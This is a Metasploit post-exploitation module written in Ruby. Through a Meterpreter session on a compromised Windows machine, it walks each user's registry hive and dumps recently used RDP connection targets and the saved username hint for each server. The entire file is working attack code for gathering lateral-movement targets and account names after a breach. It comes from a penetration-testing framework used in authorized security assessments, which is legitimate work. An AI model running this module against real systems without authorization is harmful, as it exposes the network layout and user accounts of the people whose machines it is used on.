##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Terminal Server Client Connection Information Dumper',
        'Description' => %q{
          This module dumps MRU and connection data for RDP sessions.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'mubix' ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_registry_open_key
            ]
          }
        }
      )
    )
  end

  def run
    userhives = load_missing_hives
    userhives.each do |hive|
      next if hive['HKU'].nil?

      print_status("Doing enumeration for #{hive['SID']}")
      root_key, base_key = session.sys.registry.splitkey("#{hive['HKU']}\\Software\\Microsoft\\Terminal\ Server\ Client")
      begin
        tmpkey = session.sys.registry.open_key(root_key, base_key, KEY_READ)
        tmpkey_values = tmpkey.enum_key
        if tmpkey_values.include?('Default')
          defaultkey = session.sys.registry.open_key(root_key, base_key + '\\Default', KEY_READ)
          print_good('Systems connected to:')
          defaultkey.enum_value.each do |x|
            if x.name =~ /^MRU/
              print_good("--> #{defaultkey.query_value(x.name).data}")
            end
          end
        end

        if tmpkey_values.include?('Servers')
          serverskey = session.sys.registry.open_key(root_key, base_key + '\\Servers', KEY_READ)
          serverskey_keys = serverskey.enum_key
          print_good('Server list and user hints:')
          serverskey_keys.each do |hostval|
            hostvalkey = session.sys.registry.open_key(root_key, base_key + '\\Servers\\' + hostval, KEY_READ)
            print_good("#{hostval} is connected to as #{hostvalkey.query_value('UsernameHint').data}")
          end
        end
      rescue Rex::Post::Meterpreter::RequestError => e
        vprint_error(e.message)
      end
    end
    unload_our_hives(userhives)
  end
end
